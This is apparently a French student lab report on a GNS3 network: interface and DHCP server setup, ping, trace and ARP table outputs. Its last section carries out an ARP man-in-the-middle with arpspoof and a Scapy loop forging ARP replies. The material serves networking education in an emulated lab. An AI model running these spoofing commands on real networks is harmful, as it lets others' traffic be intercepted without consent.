# tp2-GNS3

## etape1

```bash
sudo vi /etc/sysconfig/network-scripts/ifcfg-eth0
```

**contenu:**

```
DEVICE=eth0
NAME=nat
BOOTPROTO=dhcp
ONBOOT=yes
```

```bash
sudo nmcli connection reload
sudo nmcli connection up nat
```

**Test de connectivité :**

```bash
ping 8.8.8.8
```

**Résultat :**

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=113 time=23.4 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=113 time=36.8 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=113 time=25.3 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=113 time=29.2 ms
```

```bash
sudo vi /etc/sysconfig/network-scripts/ifcfg-eth1
```

**contenu:**

```
DEVICE=eth1
NAME=lan

BOOTPROTO=static
ONBOOT=yes

IPADDR=10.2.1.254
NETMASK=255.255.255.0
```

```bash
sudo nmcli connection reload
sudo nmcli connection up lan
```

**Afficher les interfaces réseau :**

```bash
ip a
```

**Résultat :**

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group defau0
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP gro0
    link/ether 0c:07:55:a4:00:00 brd ff:ff:ff:ff:ff:ff
    altname enp0s3
    altname ens3
    inet 192.168.122.218/24 brd 192.168.122.255 scope global dynamic noprefixro0
       valid_lft 3082sec preferred_lft 3082sec
    inet6 fe80::e07:55ff:fea4:0/64 scope link
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP gro0
    link/ether 0c:07:55:a4:00:01 brd ff:ff:ff:ff:ff:ff
    altname enp0s4
    altname ens4
    inet 10.2.1.254/24 brd 10.2.1.255 scope global noprefixroute eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::e07:55ff:fea4:1/64 scope link
       valid_lft forever preferred_lft forever
```

## Configuration de node1

### Ping de node1 vers router

```bash
ping 10.2.1.254
```

**Résultat :**

```
84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=3.093 ms
84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=3.395 ms
84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=2.212 ms
84 bytes from 10.2.1.254 icmp_seq=4 ttl=64 time=2.400 ms
84 bytes from 10.2.1.254 icmp_seq=5 ttl=64 time=1.684 ms
```

### Ping de node1 vers 8.8.8.8

```bash
ping 8.8.8.8
```

**Résultat :**

```
84 bytes from 8.8.8.8 icmp_seq=1 ttl=108 time=61.994 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=108 time=86.531 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=108 time=45.078 ms
84 bytes from 8.8.8.8 icmp_seq=4 ttl=108 time=60.953 ms
84 bytes from 8.8.8.8 icmp_seq=5 ttl=108 time=70.305 ms
```

**Trace vers 8.8.8.8 :**

```bash
trace 8.8.8.8
```

**Résultat :**

```
trace to 8.8.8.8, 8 hops max, press Ctrl+C to stop
 1   10.2.1.254   6.385 ms  2.220 ms  0.811 ms
 2   192.168.122.1   3.353 ms  1.950 ms  1.917 ms
 3   10.0.3.2   3.015 ms  1.565 ms  1.540 ms
 4   *10.0.3.2   48.571 ms (ICMP type:3, code:3, Destination port unreachable)
```

## Afficher la CAM Table du switch

```
Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0050.7966.6800    DYNAMIC     Et0/0
   1    0c7e.7046.0001    DYNAMIC     Et0/1
Total Mac Addresses for this criterion: 2
```


## etape 2

### Installation et configuration du serveur DHCP sur le serveur dhcp

```bash
ip a
```

**Résultat :**

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group defau0
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP gro0
    link/ether 0c:34:22:11:00:00 brd ff:ff:ff:ff:ff:ff
    altname enp0s3
    altname ens3
    inet 10.2.1.253/24 brd 10.2.1.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::e34:22ff:fe11:0/64 scope link
       valid_lft forever preferred_lft forever
```

```bash
ping 8.8.8.8
```

**Résultat :**

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=24.8 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=23.4 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=27.0 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=26.4 ms
```

### Configuration DHCP

```bash
sudo dnf -y install dhcp-server
sudo vi /etc/dhcp/dhcpd.conf
```



```
# this DHCP server to be declared valid
authoritative;

# specify network address and subnetmask
subnet 10.2.1.0 netmask 255.255.255.0 {
    # specify the range of lease IP address
    range dynamic-bootp 10.2.1.10 10.2.1.199;
    # specify broadcast address
    option broadcast-address 10.2.1.255;
    # specify gateway
    option routers 10.2.1.254;
}
```

### Test du DHCP sur node1

```bash
PC1> dhcp
```

**Résultat :**

```
DDORA IP 10.2.1.10/24 GW 10.2.1.254
```

### BONUS


```
# this DHCP server to be declared valid
authoritative;

# specify network address and subnetmask
subnet 10.2.1.0 netmask 255.255.255.0 {
    # specify the range of lease IP address
    range dynamic-bootp 10.2.1.10 10.2.1.199;
    # specify broadcast address
    option broadcast-address 10.2.1.255;
    # specify gateway
    option routers 10.2.1.254;
    option domain-name-servers 1.1.1.1;
}
```
### wireshark 
dhcp.pcapng

## etape 3


#### Affichez la table ARP de router

```bash
ip neighbor show
```

**Résultat :**

```
10.2.1.1 dev eth1 lladdr 00:50:79:66:68:00 STALE
192.168.122.1 dev eth0 lladdr 52:54:00:23:04:c2 STALE
10.2.1.253 dev eth1 lladdr 0c:f8:d7:6a:00:00 STALE
```

#### Wireshark
arp.pcapng

#### Envoyer une trame ARP arbitraire

```bash
sudo apt install arping
sudo arping 10.2.1.10
```

**Résultat :**

```
ARPING 10.2.1.10
58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=0 time=7.364 msec
58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=1 time=20.459 msec
58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=2 time=27.459 msec
58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=3 time=53.700 msec
58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=4 time=7.344 msec
58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=5 time=17.578 msec
^C
--- 10.2.1.10 statistics ---
3 packets transmitted, 6 packets received,   0% unanswered (3 extra)
rtt min/avg/max/std-dev = 7.344/22.317/53.700/15.732 ms
```

```bash
PC1> show arp
```

**Résultat :**

```
0c:e6:03:92:00:00  10.2.1.11 expires in 79 seconds
```

#### Mettre en place un ARP MITM

```bash
sudo apt install dsniff
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i ens4 -r -t 10.2.1.10 10.2.1.254
```

**Résultat :**

```
c:e6:3:92:0:0 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at c:e6:3:92:0:0
c:e6:3:92:0:0 c:a:72:0:0:1 0806 42: arp reply 10.2.1.10 is-at c:e6:3:92:0:0
c:e6:3:92:0:0 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at c:e6:3:92:0:0
c:e6:3:92:0:0 c:a:72:0:0:1 0806 42: arp reply 10.2.1.10 is-at c:e6:3:92:0:0
```

#### Table ARP de node1 :

```bash
show arp
```

**Résultat :**

```
0c:e6:03:92:00:00  10.2.1.11 expires in 28 seconds
0c:e6:03:92:00:00  10.2.1.254 expires in 120 seconds
```

```bash
ip neighbor show
```

**Résultat :**

```
10.2.1.11 dev eth1 lladdr 0c:e6:03:92:00:00 STALE
192.168.122.1 dev eth0 lladdr 52:54:00:23:04:c2 STALE
10.2.1.253 dev eth1 lladdr 0c:f8:d7:6a:00:00 STALE
10.2.1.10 dev eth1 lladdr 0c:e6:03:92:00:00 REACHABLE
```

#### Capture Wireshark : `arp_mitm.pcap`

### Réaliser la même attaque avec Scapy

**Script Python :**

```python
from scapy.all import *

victime = Ether(dst="00:50:79:66:68:00")/ARP (pdst="10.2.1.10", psrc="10.2.1.254")
routeur = Ether(dst="0c:0a:72:00:00:01")/ARP (pdst="10.2.1.254", psrc="10.2.1.10")

while True:
    sendp(victime, iface="enp0s3")
    sendp(routeur, iface="enp0s3")
```

